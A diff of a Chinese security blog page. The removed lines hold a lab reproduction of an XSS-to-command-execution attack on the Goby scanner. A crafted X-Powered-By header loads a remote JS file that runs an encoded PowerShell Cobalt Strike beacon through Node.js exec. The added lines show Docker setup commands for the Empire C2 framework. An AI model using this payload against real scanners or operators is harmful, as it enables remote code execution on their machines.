@@ -4,7 +4,7 @@
 <head>
     <meta charset="utf-8">
     
-    <title>反制Goby扫描之XSS点击上线 | RainMaker</title>
+    <title>RainMaker</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
     
@@ -131,7 +131,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckww6hvxo003hrk4z2qofcend" class="article article-type-post" itemscope
+    <article id="post-ckww6hvwk0022rk4z2c7t3cf8" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -143,33 +143,15 @@
         
 
         
-        <header class="article-header">
-            
-  
-    <h1 class="article-title" itemprop="name">
-      反制Goby扫描之XSS点击上线
-    </h1>
-  
-
-        </header>
-        
 
         <div class="article-more-info article-more-info-post hairline">
 
             <div class="article-date">
-  <time datetime="2021-08-15T06:22:34.000Z" itemprop="datePublished">2021-08-15</time>
+  <time datetime="2021-12-06T15:49:39.935Z" itemprop="datePublished">2021-12-06</time>
 </div>
 
             
-            <div class="article-category">
-                <a class="article-category-link" href="/categories/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">溯源反制</a>
-            </div>
-            
 
-            
-            <div class="article-tag">
-                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Goby/" rel="tag">Goby</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li></ul>
-            </div>
             
 
             
@@ -181,49 +163,14 @@
         </div>
 
         <div class="article-entry post-inner-html hairline" itemprop="articleBody">
-            <p>最近看到有大佬利用goby漏洞反制攻击者，特意复现下，原理就是通过XSS进行交互，调用Node.js函数exec执行命令，最新版本已经进行了修复，如果还在使用低版本还是尽快升级吧。</p>
-<span id="more"></span>
+            <pre><code class="hljs shell">
 
-<h1 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1.测试环境"></a>1.测试环境</h1><ul>
-<li>CS4.3</li>
-<li>goby-win-x64-1.8.255，Goby扫描器IP：192.168.0.195</li>
-<li>phpstudy2016，http服务:<a target="_blank" rel="noopener" href="http://192.168.0.198:81/index.php">http://192.168.0.198:81/index.php</a></li>
-</ul>
-<h1 id="2-XSS测试"><a href="#2-XSS测试" class="headerlink" title="2.XSS测试"></a>2.XSS测试</h1><p>修改http服务器的<code>X-Powered-By</code>，注意此处<code>&lt;img    src=1    onerror=alert(1)&gt;</code> 标签中应该是tab，而非空格。</p>
-<pre><code class="hljs html">&lt;?php
-header(&quot;X-Powered-By: PHP/<span class="hljs-tag">&lt;<span class="hljs-name">img</span>	<span class="hljs-attr">src</span>=<span class="hljs-string">1</span>	<span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span>&quot;);
-?&gt;
-<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
-<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>SEC TEST<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
-<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
-<p>扫描之后结果如下：<br><img src="https://img-blog.csdnimg.cn/44ae9fd8adb94355bc9b0db458305d74.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>点击即可触发XSS：<br><img src="https://img-blog.csdnimg.cn/8f04cf1348e140f4bef797fefd21775e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="3-CS上线"><a href="#3-CS上线" class="headerlink" title="3.CS上线"></a>3.CS上线</h1><p>利用<code>require(&#39;child_process&#39;).exec()</code>函数进行命令执行，在以上的基础上：<br>服务器端代码如下：</p>
-<pre><code class="hljs html">&lt;?php
-header(&quot;X-Powered-By: PHP/<span class="hljs-tag">&lt;<span class="hljs-name">img</span>	<span class="hljs-attr">src</span>=<span class="hljs-string">1</span>	<span class="hljs-attr">onerror</span>=<span class="hljs-string">import(unescape(</span>&#x27;<span class="hljs-attr">http</span>%<span class="hljs-attr">3A</span>//<span class="hljs-attr">192.168.0.198:81</span>/<span class="hljs-attr">js</span>/<span class="hljs-attr">1.js</span>&#x27;))&gt;</span>&quot;);
-?&gt;
-<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
-<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>SEC TEST<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
-<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
-<p><code>1.js</code>内容如下，执行内容为CS的powershell上线脚本：</p>
-<pre><code class="hljs javascript">(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;
-<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).exec(<span class="hljs-string">&#x27;powershell -nop -w hidden -encodedcommand JABXXXXXXXX......&#x27;</span>);
-&#125;)();</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/e8a3e00b1c5d4105acda3110c44a5416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>可以先使用计算器进行测试。</p>
-<pre><code class="hljs javascript">(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).exec(<span class="hljs-string">&#x27;calc.exe&#x27;</span>);&#125;)();</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/4e6570a60d9a4d38915d69d8bb09beb5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>踩坑：</strong></p>
-<ol>
-<li>js函数要设置void的话就无返回值，程序运行不起来的。</li>
-<li>goby存在缓存，改动JS后建议删掉goby重新跑一遍。</li>
-</ol>
 
+docker pull empireproject/empire
+docker run -it -p 7000:7000 --name empire empireproject/empire /bin/bash
+sudo ./setup/reset.sh
+sudo ./empire
+<span class="hljs-meta">#</span><span class="bash">pip install pefile初始运行可能缺少这个包</span></code></pre>
         </div>
 
     </div>
@@ -247,19 +194,19 @@ header(&quot;X-Powered-By: PHP/<span class="hljs-tag">&lt;<span class="hljs-name
     
 <nav class="article-nav">
   
-    <a href="/a74c6112.html" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/f0bfc07b.html" id="article-nav-newer" class="article-nav-link-wrap">
       <div class="article-nav-caption">下一篇</div>
       <div class="article-nav-title">
         
-          快速设置博客前页-Front-matter
+          Empire.1-配置安装
         
       </div>
     </a>
   
   
-    <a href="/a7a10e0e.html" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/40b5e599.html" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-caption">上一篇</div>
-      <div class="article-nav-title">docx批量转markdown脚本分享</div>
+      <div class="article-nav-title">内网学习笔记一 | 内网信息搜集</div>
     </a>
   
 </nav>
@@ -268,15 +215,15 @@ header(&quot;X-Powered-By: PHP/<span class="hljs-tag">&lt;<span class="hljs-name
     <section class="share">
         <div class="share-title">分享</div>
         <a class="share-item" target="_blank"
-            href="https://twitter.com/share?text=反制Goby扫描之XSS点击上线 - RainMaker&url=http://hasaki-h2.github.io/1bfef19e.html">
+            href="https://twitter.com/share?text= - RainMaker&url=http://hasaki-h2.github.io/0.html">
             <box-icon type='logo' name='twitter'></box-icon>
         </a>
         <a class="share-item" target="_blank"
-            href="https://www.facebook.com/sharer.php?title=反制Goby扫描之XSS点击上线 - RainMaker&u=http://hasaki-h2.github.io/1bfef19e.html">
+            href="https://www.facebook.com/sharer.php?title= - RainMaker&u=http://hasaki-h2.github.io/0.html">
             <box-icon name='facebook-square' type='logo' ></box-icon>
         </a>
         <!-- <a class="share-item" target="_blank"
-            href="https://service.weibo.com/share/share.php?title=反制Goby扫描之XSS点击上线 - RainMaker&url=http://hasaki-h2.github.io/1bfef19e.html&pic=">
+            href="https://service.weibo.com/share/share.php?title= - RainMaker&url=http://hasaki-h2.github.io/0.html&pic=">
             <div class="n-icon n-icon-weibo"></div>
         </a> -->
     </section>
